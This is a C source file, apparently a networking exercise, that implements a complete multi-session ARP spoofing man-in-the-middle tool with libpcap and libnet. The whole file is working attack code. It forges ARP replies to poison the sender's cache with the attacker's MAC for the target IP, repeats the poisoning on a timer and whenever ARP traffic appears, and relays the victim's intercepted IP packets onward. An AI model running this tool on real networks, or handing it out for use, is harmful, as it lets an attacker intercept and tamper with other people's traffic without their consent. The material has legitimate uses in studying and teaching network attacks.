#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <pcap.h>
#include <stdio.h>
#include <netinet/ip.h>
#include <libnet.h>
#include <net/if.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <net/ethernet.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <time.h>
#include <pthread.h>

#define IP_ADDR_LEN 4

#pragma pack(push,1)
struct arp_packet{									// 구조체 원소 사이 빈 공간 없애기
	struct libnet_ethernet_hdr ETH_hdr;
	struct libnet_arp_hdr ARP_hdr;
	uint8_t src_hrd_addr[ETHER_ADDR_LEN];
	struct in_addr src_pro_addr;
	uint8_t des_hrd_addr[ETHER_ADDR_LEN];
	struct in_addr des_pro_addr;
};
#pragma pack(pop)

struct THREAD_DATA{									// struct for arguments of infection thread
	pcap_t * _fp;
	unsigned int * _status;
	unsigned int _time_interval;
	struct arp_packet * _packet;
	int _th_num;
};

struct SESSION_DATA{									// struct for aguments of session thread
        unsigned int * _status;
        unsigned int _time_interval;
        char *_argv[3];
	int _th_num;
};

int getMacAddress(uint8_t * my_mac, char * interface)					// get mac address about my interface
{
	int sock;
        struct ifreq ifr;
        struct sockaddr_in *sin;

        sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0)
	{
		printf("Error - socket\n");
		return 0;
	}

        strcpy(ifr.ifr_name, interface);
        if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0)
        {
                printf("Error - get my_mac\n");
		close(sock);
                return 0;
        }
	memcpy(my_mac, ifr.ifr_hwaddr.sa_data, ETHER_ADDR_LEN);
	

	close(sock);
	return 0;
	
}

int getIpAddress(struct in_addr * my_ip, char * interface)				// get ip address about my interface
{
	int sock;
        struct ifreq ifr;
        struct sockaddr_in *sin;

        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0)
        {
                printf("Error - socket\n");
                return 0;
        }

        strcpy(ifr.ifr_name, interface);
        if (ioctl(sock, SIOCGIFADDR, &ifr) < 0)
        {
                printf("Error - get my_ip\n");
                close(sock);
                return 0;
        }
	
	sin = (struct sockaddr_in *)&ifr.ifr_addr;
        (*my_ip).s_addr = (sin->sin_addr).s_addr;

        close(sock);
        return 0;

}


int print_packet(struct arp_packet * packet)						// print about arp packet
{	
	printf("--------packet data--------\n");
	printf("ether_dhost	: %02x:%02x:%02x:%02x:%02x:%02x\n",
	  packet->ETH_hdr.ether_dhost[0],
	  packet->ETH_hdr.ether_dhost[1],
	  packet->ETH_hdr.ether_dhost[2],
	  packet->ETH_hdr.ether_dhost[3],
	  packet->ETH_hdr.ether_dhost[4],
	  packet->ETH_hdr.ether_dhost[5]);

	printf("ether_shost     : %02x:%02x:%02x:%02x:%02x:%02x\n",
          packet->ETH_hdr.ether_shost[0],
          packet->ETH_hdr.ether_shost[1],
          packet->ETH_hdr.ether_shost[2],
          packet->ETH_hdr.ether_shost[3],
          packet->ETH_hdr.ether_shost[4],
          packet->ETH_hdr.ether_shost[5]);

	printf("ether_type	: %04x\n", ntohs(packet->ETH_hdr.ether_type));

	printf("ar_hrd		: %04x\n", ntohs(packet->ARP_hdr.ar_hrd));
	printf("ar_pro          : %04x\n", ntohs(packet->ARP_hdr.ar_pro));
	printf("ar_hln          : %02x\n", packet->ARP_hdr.ar_hln);
	printf("ar_pln          : %02x\n", packet->ARP_hdr.ar_pln);
	printf("ar_op		: %04x\n", ntohs(packet->ARP_hdr.ar_op));

	printf("src_hdr_addr	: %02x:%02x:%02x:%02x:%02x:%02x\n",
          packet->src_hrd_addr[0],
          packet->src_hrd_addr[1],
          packet->src_hrd_addr[2],
          packet->src_hrd_addr[3],
          packet->src_hrd_addr[4],
          packet->src_hrd_addr[5]);

	printf("src_pro_addr	: %s\n", inet_ntoa(packet->src_pro_addr));

	printf("des_hdr_addr    : %02x:%02x:%02x:%02x:%02x:%02x\n",
          packet->des_hrd_addr[0],
          packet->des_hrd_addr[1],
          packet->des_hrd_addr[2],
          packet->des_hrd_addr[3],
          packet->des_hrd_addr[4],
          packet->des_hrd_addr[5]);

        printf("des_pro_addr    : %s\n", inet_ntoa(packet->des_pro_addr));

	return 0;
}

void make_arp_packet(	struct arp_packet * packet, uint8_t ether_dhost[], uint8_t ether_shost[], uint16_t ether_type, 
			uint16_t arp_hrd_type, uint16_t arp_pro_type, uint8_t arp_hlen, uint8_t arp_plen, 
			uint16_t arp_opcode, uint8_t src_hrd_addr[ETHER_ADDR_LEN], struct in_addr * src_pro_addr, 
			uint8_t des_hrd_addr[ETHER_ADDR_LEN], struct in_addr * des_pro_addr)
{
	uint16_t tmp = ntohs(ether_type);
	memcpy(packet->ETH_hdr.ether_dhost, ether_dhost, ETHER_ADDR_LEN);     
        memcpy(packet->ETH_hdr.ether_shost, ether_shost, ETHER_ADDR_LEN);
        memcpy(&packet->ETH_hdr.ether_type, &tmp, 2);            

	tmp = ntohs(arp_hrd_type);
        memcpy(&packet->ARP_hdr.ar_hrd, &tmp, 2);
	tmp = ntohs(arp_pro_type);
        memcpy(&packet->ARP_hdr.ar_pro, &tmp, 2);
        memcpy(&packet->ARP_hdr.ar_hln, &arp_hlen, 1);                      
        memcpy(&packet->ARP_hdr.ar_pln, &arp_plen, 1);                      
	tmp = ntohs(arp_opcode);
        memcpy(&packet->ARP_hdr.ar_op, &tmp, 2);

        memcpy(packet->src_hrd_addr, src_hrd_addr, ETHER_ADDR_LEN);          
        memcpy(&packet->src_pro_addr, src_pro_addr, sizeof(struct in_addr));
        memcpy(packet->des_hrd_addr, des_hrd_addr, ETHER_ADDR_LEN);         
        memcpy(&packet->des_pro_addr, des_pro_addr, sizeof(struct in_addr));
}
void get_mac_addr(	int th_num, uint8_t result_ether_addr[], struct in_addr * result_ip, struct in_addr * my_ip, 
			pcap_t * fp, struct arp_packet * packet, uint8_t my_mac[], uint16_t ether_type,
                        uint16_t arp_hrd_type, uint16_t arp_pro_type, uint16_t arp_opcode)
{												// get sender mac address
	uint8_t BROADCAST_MAC[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	uint8_t BROADCAST_MAC2[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

	make_arp_packet(packet, BROADCAST_MAC, my_mac, ether_type, arp_hrd_type, arp_pro_type, ETHER_ADDR_LEN,
                        IP_ADDR_LEN, arp_opcode, my_mac, my_ip, BROADCAST_MAC2, result_ip);

        if(pcap_sendpacket(fp, (unsigned char *)packet, sizeof(struct arp_packet)))             // send packet
        {       
                fprintf(stderr, "\nError sending the packet\n");
                exit(0);
        }
	
        while (true){
                struct pcap_pkthdr* header;
                struct libnet_ethernet_hdr* ETH_header;
                const u_char* rcv_packet;
		struct arp_packet * rcv_arp_packet;
                int res = pcap_next_ex(fp, &header, &rcv_packet);
                if (res == 0) continue;
                if (res == -1 || res == -2) break;

		rcv_arp_packet = (arp_packet *)rcv_packet;
                ETH_header = (libnet_ethernet_hdr *)rcv_packet;
                if(ntohs(ETH_header->ether_type) != ETHERTYPE_ARP)                              // if not ARP
                        continue;

		char result_ip_str[20] = "";
		char packet_src_ip_str[20] = "";
		char my_ip_str[20] = "";
		char packet_des_ip_str[20] = "";
		inet_ntop(AF_INET, result_ip, result_ip_str, 20);
		inet_ntop(AF_INET, &(rcv_arp_packet->src_pro_addr), packet_src_ip_str, 20);
		inet_ntop(AF_INET, my_ip, my_ip_str, 20);
		inet_ntop(AF_INET, &(rcv_arp_packet->des_pro_addr), packet_des_ip_str, 20);

                if(strcmp(result_ip_str, packet_src_ip_str) == 0)                		// src_pro_addr == sender_ip
                {
                        if(strcmp(my_ip_str, packet_des_ip_str) == 0)            		// des_pro_addr== my_ip
                        {	
                                memcpy(result_ether_addr, &(rcv_arp_packet->src_hrd_addr), ETHER_ADDR_LEN);
                                break;								// sender mac get
                        }
                }
        }
}

void *t_arp_infection(void *th_data)								// function for infection thread
{
	pcap_t *fp;
	unsigned int *status, time_interval;
	struct arp_packet * packet;
	int th_num;
	struct THREAD_DATA * arg = (struct THREAD_DATA *)th_data;
	fp = arg->_fp;
	status = arg->_status;
	time_interval = arg->_time_interval;
	packet = arg->_packet;
	th_num = arg->_th_num;

//	printf("#%d ", th_num);	
//	print_packet(packet);
	
	while(*status)
	{	
		if(pcap_sendpacket(fp, (unsigned char *)packet, sizeof(arp_packet)))          	// send packet infinitely
        	{
                	fprintf(stderr, "\nError sending the packet\n");
	                exit(0);
        	}
		sleep(time_interval);
	}
	printf("[*] #%d Infection Thread End\n", th_num);
}

void * t_make_session(void * main_th_data)							// function for session thread
{
	unsigned int *status, time_interval;
	char * argv[3];
	int th_num;
	struct SESSION_DATA * arg = (struct SESSION_DATA *)main_th_data;
	status = arg->_status;
	time_interval = arg->_time_interval;
	argv[0] = arg->_argv[0];
	argv[1] = arg->_argv[1];
	argv[2] = arg->_argv[2];
	th_num = arg->_th_num;

	pcap_t *fp;
	char* dev = argv[0];
	char errbuf[PCAP_ERRBUF_SIZE];
	fp = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (fp == NULL) {
    		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		exit(0);
	}
	
	pthread_t p_infection_th;
	int thr_id;
	struct THREAD_DATA th_data;

	uint8_t my_mac[ETHER_ADDR_LEN], sender_mac[ETHER_ADDR_LEN], target_mac[ETHER_ADDR_LEN];
	struct in_addr * my_ip, *sender_ip, *target_ip;
	my_ip = (struct in_addr *)calloc(1, sizeof(in_addr));
	sender_ip = (struct in_addr *)calloc(1, sizeof(in_addr));
	target_ip = (struct in_addr *)calloc(1, sizeof(in_addr));
	struct arp_packet * packet, *th_packet;
	packet = (struct arp_packet *)calloc(1, sizeof(arp_packet));
	th_packet = (struct arp_packet *)calloc(1, sizeof(arp_packet));

	uint16_t ether_type = ETHERTYPE_ARP;							// ARP	: 0x0806
	uint16_t arp_hrd_type = ARPHRD_ETHER;							// Ethernet : 0x0001
	uint16_t arp_pro_type =ETHERTYPE_IP;							// IPv4	: 0x0800
	uint16_t arp_opcode = ARPOP_REQUEST;							// request : 0x0001
	
	getMacAddress(my_mac, dev);								// get my mac, ip
	getIpAddress(my_ip, dev);
	inet_aton(argv[1], sender_ip);								// get sender ip
	inet_aton(argv[2], target_ip);								// get target ip
	
	get_mac_addr(th_num, sender_mac, sender_ip, my_ip, fp, packet, my_mac, ether_type, arp_hrd_type, arp_pro_type, arp_opcode);
	get_mac_addr(th_num, target_mac, target_ip, my_ip, fp, packet, my_mac, ether_type, arp_hrd_type, arp_pro_type, arp_opcode);

	arp_opcode = ARPOP_REPLY;								// reply : 2
	make_arp_packet(packet, sender_mac, my_mac, ether_type, arp_hrd_type, arp_pro_type, ETHER_ADDR_LEN, 
			IP_ADDR_LEN, arp_opcode, my_mac, target_ip, sender_mac, sender_ip);

	memcpy(th_packet, packet, sizeof(arp_packet));						// make packet for infection

	th_data._fp = fp;
	th_data._status = status;
	th_data._time_interval = time_interval;
	th_data._packet = th_packet;
	th_data._th_num = th_num;
	
	thr_id = pthread_create(&p_infection_th, NULL, t_arp_infection, (void *)&th_data);	// infection thread
        if (thr_id < 0)
        {
                perror("thread create error : ");
                exit(0);
        }
	pthread_detach(p_infection_th);
	
	while (*status){
                struct pcap_pkthdr* header;
                struct libnet_ethernet_hdr* ETH_header;
		struct libnet_ipv4_hdr* IP_header;
                const u_char* rcv_packet;
                struct in_addr* src_pro_addr;
                int res = pcap_next_ex(fp, &header, &rcv_packet);
                if (res == 0) continue;
                if (res == -1 || res == -2) break;

                ETH_header = (libnet_ethernet_hdr *)rcv_packet;
		if(ntohs(ETH_header->ether_type) == ETHERTYPE_ARP){                            	// if ARP
                      	if(pcap_sendpacket(fp, (unsigned char *)th_packet, sizeof(arp_packet)))	// send packet
        		{
                		fprintf(stderr, "\nError sending the packet\n");
		                exit(0);
		        }
			continue;
		}
		else if (ntohs(ETH_header->ether_type) == ETHERTYPE_IP){
			rcv_packet += sizeof(struct libnet_ethernet_hdr);
			IP_header = (libnet_ipv4_hdr *)rcv_packet;
			if(	ETH_header->ether_shost[0]==sender_mac[0] && ETH_header->ether_shost[1]==sender_mac[1] && 
				ETH_header->ether_shost[2]==sender_mac[2] && ETH_header->ether_shost[3]==sender_mac[3] && 
				ETH_header->ether_shost[4]==sender_mac[4] && ETH_header->ether_shost[5]==sender_mac[5] && 	
												// src_mac == sender_mac
				ETH_header->ether_dhost[0]==my_mac[0] && ETH_header->ether_dhost[1]==my_mac[1] &&
				ETH_header->ether_dhost[2]==my_mac[2] && ETH_header->ether_dhost[3]==my_mac[3] &&
				ETH_header->ether_dhost[4]==my_mac[4] && ETH_header->ether_dhost[5]==my_mac[5] )		
												// des_mac == my_mac
			{
				memcpy(ETH_header->ether_dhost, target_mac, ETHER_ADDR_LEN);
				memcpy(ETH_header->ether_shost, my_mac, ETHER_ADDR_LEN);
				rcv_packet -= sizeof(struct libnet_ethernet_hdr);
				if(pcap_sendpacket(fp, (unsigned char *)rcv_packet, header->caplen)) 				
												// relay packet
	                        {
        	                        fprintf(stderr, "\nError sending the packet\n");
                	                exit(0);
                        	}
	                        printf("--------Send Relay IP Packet!--------#%d\n", th_num);
			}
		}
        }
	sleep(time_interval+1);

	free(my_ip);										// memory re allocation
	free(sender_ip);
	free(target_ip);
	free(packet);
	free(th_packet);
	
	printf("[*] #%d Session Thread End\n", th_num);
}

int main(int argc, char* argv[])
{	
	char buff[10];
        char STOP[10] = "STOP";

	int session_cnt = 1, i;
	if (argc < 4 || argc %2 == 1){
		printf("Error, give me correct arguments\n");
		return -1;
	}
	session_cnt = argc/2 -1;
	pthread_t p_session_th[session_cnt];
	int thr_id;
	struct SESSION_DATA th_data[session_cnt];
	unsigned int status = 1;
	unsigned int time_interval;
	printf("[*] Give me arp infection time interval(sec) : ");	
	scanf("%d", &time_interval);								// get time interval

	for(i=0; i<session_cnt; i++)								// make argument for session thread
	{
		th_data[i]._status = &status;
		th_data[i]._time_interval = time_interval;
		th_data[i]._argv[0] = argv[1];
		th_data[i]._argv[1] = argv[i*2+2];
		th_data[i]._argv[2] = argv[i*2+3];
		th_data[i]._th_num = i+1;
	}	

	for(i=0; i<session_cnt; i++)								// create session threads
	{
		thr_id = pthread_create(&p_session_th[i], NULL, t_make_session, (void *)&(th_data[i]));		
		if (thr_id < 0)
		{
			perror("thread create error : ");
	        	exit(0);
	    	}
		pthread_detach(p_session_th[i]);
		printf("[*] Make #%d Session\n", i+1);
	}
	printf("[*] ARP SPOOFING START ON %d SESSION(S)\n", session_cnt);
	printf("[*] Type 'STOP' when you want to stop this attack\n");
	
	while(1)										// check 'STOP'
        {
                scanf("%s", buff);
                if(strcmp(STOP, buff)==0) break;
        }
        status = 0;

	sleep(time_interval+2);

	printf("[*] Program End Successfully\n");

	return 0;
}
